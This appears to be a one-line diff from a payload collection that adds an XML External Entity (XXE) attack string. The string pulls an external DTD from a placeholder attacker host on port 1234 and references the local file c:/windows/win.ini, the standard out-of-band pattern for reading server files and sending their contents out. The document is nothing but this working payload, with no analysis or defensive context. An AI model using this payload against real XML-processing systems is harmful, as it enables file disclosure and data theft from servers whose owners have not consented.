@@ -1,0 +1,1 @@
+<!DOCTYPE xmlrootname [<!ENTITY % aaa SYSTEM "http://x.x.x.x:1234/ext.dtd"><!ENTITY % bbb SYSTEM "file:///c:///windows/win.ini">%aaa;%ccc;%ddd;]>
